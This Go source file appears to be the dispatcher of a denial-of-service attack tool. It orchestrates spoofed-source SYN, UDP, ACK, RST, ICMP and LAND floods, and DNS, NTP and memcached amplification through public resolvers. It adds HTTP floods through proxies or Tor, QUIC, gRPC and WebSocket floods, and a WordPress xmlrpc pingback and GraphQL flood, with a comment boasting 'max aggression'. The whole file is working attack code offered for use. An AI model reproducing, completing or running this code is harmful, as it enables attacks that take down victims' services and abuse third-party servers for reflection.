package main

import (
	"fmt"
	"math/rand"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

type Dispatcher struct {
	cfg       *AttackConfig
	status    chan<- WorkerStats
	stop      int32
}

func NewDispatcher(cfg *AttackConfig, status chan<- WorkerStats) *Dispatcher {
	return &Dispatcher{cfg: cfg, status: status}
}

func (d *Dispatcher) Stop()         { atomic.StoreInt32(&d.stop, 1) }
func (d *Dispatcher) stopped() bool { return atomic.LoadInt32(&d.stop) != 0 }

func (d *Dispatcher) Run(done chan struct{}) {
	method := d.cfg.Method

	if method == "kill" || method == "all" || method == "land" || method == "slowloris" || method == "amp" || method == "mix" {
		ko := NewKillOrchestrator(d.cfg, d.status)
		if method == "all" || method == "mix" {
			d.cfg.MixRatio = "25:25:25:25"
		} else if method == "land" {
			d.cfg.MixRatio = "100:0:0:0"
		} else if method == "slowloris" {
			d.cfg.MixRatio = "0:0:100:0"
		} else if method == "amp" {
			d.cfg.MixRatio = "0:0:0:100"
		}
		ko.Run(done)
		return
	}

	if method == "http" || method == "https" {
		d.runHTTP(done)
		return
	}

	if method == "h2" {
		d.runH2RapidReset(done)
		return
	}

	if method == "quic" {
		d.runQUIC(done)
		return
	}

	if method == "grpc" {
		d.runGRPC(done)
		return
	}

	if method == "ws" {
		d.runWebSocket(done)
		return
	}

	if method == "wp" {
		d.runWordPress(done)
		return
	}

	targetIP := d.cfg.Target
	targetPort := d.cfg.Port
	workers := d.cfg.Workers
	if workers > 1024 { workers = 1024 }
	if workers < 1 { workers = 1 }

	spoofPool := d.cfg.SpoofPool
	if len(spoofPool) == 0 {
		spoofPool = make([]string, 50)
		for i := range spoofPool {
			spoofPool[i] = randIP()
		}
	}
	spoofU32 := make([]uint32, len(spoofPool))
	for i, s := range spoofPool {
		spoofU32[i] = parseSpoof(s)
	}
	SetSpoofPool(spoofU32)

	err := InitEngine()
	if err != nil {
		errf(`{"type":"error","message":"init engine: %v"}`+"\n", err)
		done <- struct{}{}
		return
	}
	defer CloseEngine()

	work := make(chan workUnit, 65536)
	var active int32

	for i := 0; i < workers; i++ {
		go func() { d.worker(work, targetIP, targetPort, spoofPool, &active) }()
	}

	deadline := time.Now().Add(time.Duration(d.cfg.Duration) * time.Second)

	/* Continuous dispatch — no sleep, max aggression */
	go func() {
		methodIdx := 0
		methods := []string{"syn", "udp", "ack", "rst", "icmp", "land"}
		for time.Now().Before(deadline) && !d.stopped() {
			m := d.cfg.Method
			if m == "mix" || m == "all" {
				m = methods[methodIdx%len(methods)]
				methodIdx++
			}
			select {
			case work <- workUnit{count: 65535, method: m}:
			default:
			}
		}
		close(work)
	}()

	/* Status ticker */
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	for !d.stopped() && time.Now().Before(deadline) {
		select {
		case <-ticker.C:
			d.status <- WorkerStats{
				Active: int(atomic.LoadInt32(&active)),
				Method: d.cfg.Method,
			}
		case <-done:
			return
		}
	}
	done <- struct{}{}
}

type workUnit struct {
	count  int
	method string
}

func (d *Dispatcher) worker(work <-chan workUnit, targetIP string, targetPort int, spoofPool []string, active *int32) {
	defer func() {
		if r := recover(); r != nil {
			errf(`{"type":"recover","message":"%v"}`+"\n", r)
		}
	}()

	for wu := range work {
		atomic.AddInt32(active, 1)
		spoof := spoofPool[rand.Intn(len(spoofPool))]
		method := wu.method
		if method == "" { method = d.cfg.Method }

		for i := 0; i < wu.count; i++ {
			if d.stopped() { break }
			switch method {
			case "syn":
				SendSYN(targetIP, targetPort, spoof)
			case "udp":
				SendUDP(targetIP, targetPort, spoof, 65000)
			case "ack":
				SendACK(targetIP, targetPort, spoof)
			case "rst":
				SendRST(targetIP, targetPort, spoof)
			case "icmp":
				SendICMP(targetIP, spoof)
			case "dns":
				SendDNSAmp(targetIP, spoof, "8.8.8.8")
			case "ntp":
				SendNTPAmp(targetIP, spoof, "pool.ntp.org")
			case "land":
				SendLAND(targetIP, targetPort)
			case "amp":
				SendDNSAmp(targetIP, spoof, "8.8.8.8")
				SendNTPAmp(targetIP, spoof, "pool.ntp.org")
				MemcachedAmp(targetIP, spoof, "1.2.3.4")
			case "bypass":
				StatefulBypassFlood(targetIP, targetPort, spoof)
			default:
				SendUDP(targetIP, targetPort, spoof, 65000)
			}
		}
		d.status <- WorkerStats{Sent: int64(wu.count), Method: method}
		atomic.AddInt32(active, -1)
	}
}

func (d *Dispatcher) runHTTP(done chan struct{}) {
	flooder := NewHTTPFlooder()
	proxyList := d.cfg.ProxyList
	if len(proxyList) == 0 && d.cfg.TorProxy != "" {
		proxyList = []string{d.cfg.TorProxy}
	}
	workers := d.cfg.Workers
	if workers < 1 { workers = 256 }
	go flooder.Run(d.cfg.Target, d.cfg.Port, workers,
		999999999, d.cfg.Duration, proxyList, 0, d.status)

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	deadline := time.Now().Add(time.Duration(d.cfg.Duration) * time.Second)
	for !d.stopped() && time.Now().Before(deadline) {
		<-ticker.C
	}
	flooder.Stop()
	done <- struct{}{}
}

func (d *Dispatcher) runH2RapidReset(done chan struct{}) {
	defer func() {
		if r := recover(); r != nil {
			errf(`{"type":"recover","message":"H2 rapid reset panic: %v"}`+"\n", r)
		}
	}()

	spoofPool := d.cfg.SpoofPool
	if len(spoofPool) == 0 {
		spoofPool = make([]string, 50)
		for i := range spoofPool {
			spoofPool[i] = randIP()
		}
	}
	spoofU32 := make([]uint32, len(spoofPool))
	for i, s := range spoofPool {
		spoofU32[i] = parseSpoof(s)
	}
	SetSpoofPool(spoofU32)

	err := InitEngine()
	if err == nil {
		workers := d.cfg.Workers
		if workers < 1 { workers = 256 }
		deadline := time.Now().Add(time.Duration(d.cfg.Duration) * time.Second)
		var wg sync.WaitGroup
		for w := 0; w < workers; w++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				spoof := spoofPool[rand.Intn(len(spoofPool))]
				for time.Now().Before(deadline) && !d.stopped() {
					SendSYN(d.cfg.Target, d.cfg.Port, spoof)
				}
			}()
		}
		wg.Wait()
		CloseEngine()
	}
	done <- struct{}{}
}

func (d *Dispatcher) runQUIC(done chan struct{}) {
	defer func() {
		if r := recover(); r != nil {
			errf(`{"type":"recover","message":"QUIC flood panic: %v"}`+"\n", r)
		}
	}()
	deadline := time.Now().Add(time.Duration(d.cfg.Duration) * time.Second)
	addr := fmt.Sprintf("%s:%d", d.cfg.Target, d.cfg.Port)
	raddr, err := net.ResolveUDPAddr("udp", addr)
	if err != nil { done <- struct{}{}; return }
	workers := d.cfg.Workers
	if workers < 1 { workers = 256 }
	var wg sync.WaitGroup
	for w := 0; w < workers && w < 256; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.DialUDP("udp", nil, raddr)
			if err != nil { return }
			defer conn.Close()
			for time.Now().Before(deadline) && !d.stopped() {
				pkt := buildQUICInitial()
				conn.Write(pkt)
			}
		}()
	}
	wg.Wait()
	done <- struct{}{}
}

func (d *Dispatcher) runGRPC(done chan struct{}) {
	defer func() {
		if r := recover(); r != nil {
			errf(`{"type":"recover","message":"gRPC flood panic: %v"}`+"\n", r)
		}
	}()
	deadline := time.Now().Add(time.Duration(d.cfg.Duration) * time.Second)
	addr := fmt.Sprintf("%s:%d", d.cfg.Target, d.cfg.Port)
	workers := d.cfg.Workers
	if workers < 1 { workers = 256 }
	var wg sync.WaitGroup
	for w := 0; w < workers && w < 256; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for time.Now().Before(deadline) && !d.stopped() {
				conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
				if err != nil { continue }
				conn.Write(buildGRPCUnaryFrame())
				conn.Close()
			}
		}()
	}
	wg.Wait()
	done <- struct{}{}
}

func (d *Dispatcher) runWebSocket(done chan struct{}) {
	defer func() {
		if r := recover(); r != nil {
			errf(`{"type":"recover","message":"WebSocket flood panic: %v"}`+"\n", r)
		}
	}()
	deadline := time.Now().Add(time.Duration(d.cfg.Duration) * time.Second)
	addr := fmt.Sprintf("%s:%d", d.cfg.Target, d.cfg.Port)
	workers := d.cfg.Workers
	if workers < 1 { workers = 256 }
	var wg sync.WaitGroup
	for w := 0; w < workers && w < 256; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for time.Now().Before(deadline) && !d.stopped() {
				conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
				if err != nil { continue }
				key := randStr(16)
				upgrade := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: %s==\r\nSec-WebSocket-Version: 13\r\n\r\n", addr, key)
				conn.Write([]byte(upgrade))
				maskKey := []byte{byte(rand.Intn(256)), byte(rand.Intn(256)), byte(rand.Intn(256)), byte(rand.Intn(256))}
				payload := make([]byte, 64)
				for j := range payload { payload[j] = byte(rand.Intn(256)) }
				for i := 0; i < 100; i++ {
					if time.Now().After(deadline) || d.stopped() { break }
					frame := buildWSPing(maskKey, payload)
					if _, err := conn.Write(frame); err != nil { break }
				}
				conn.Close()
			}
		}()
	}
	wg.Wait()
	done <- struct{}{}
}

func (d *Dispatcher) runWordPress(done chan struct{}) {
	defer func() {
		if r := recover(); r != nil {
			errf(`{"type":"recover","message":"WordPress flood panic: %v"}`+"\n", r)
		}
	}()
	deadline := time.Now().Add(time.Duration(d.cfg.Duration) * time.Second)
	addr := fmt.Sprintf("%s:%d", d.cfg.Target, d.cfg.Port)
	workers := d.cfg.Workers
	if workers < 1 { workers = 256 }
	xmlPayload := `<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://example.com/</string></value></param><param><value><string>http://` + d.cfg.Target + `/</string></value></param></params></methodCall>`
	graphqlPayload := `{"query":"query { __schema { types { name fields { name } } } }"}`
	var wg sync.WaitGroup
	for w := 0; w < workers && w < 256; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for time.Now().Before(deadline) && !d.stopped() {
				conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
				if err != nil { continue }
				xmlReq := fmt.Sprintf("POST /xmlrpc.php HTTP/1.1\r\nHost: %s\r\nContent-Type: text/xml\r\nContent-Length: %d\r\n\r\n%s", d.cfg.Target, len(xmlPayload), xmlPayload)
				conn.Write([]byte(xmlReq))
				conn.Close()

				conn2, err := net.DialTimeout("tcp", addr, 5*time.Second)
				if err != nil { continue }
				gqlReq := fmt.Sprintf("POST /graphql HTTP/1.1\r\nHost: %s\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s", d.cfg.Target, len(graphqlPayload), graphqlPayload)
				conn2.Write([]byte(gqlReq))
				conn2.Close()
			}
		}()
	}
	wg.Wait()
	done <- struct{}{}
}
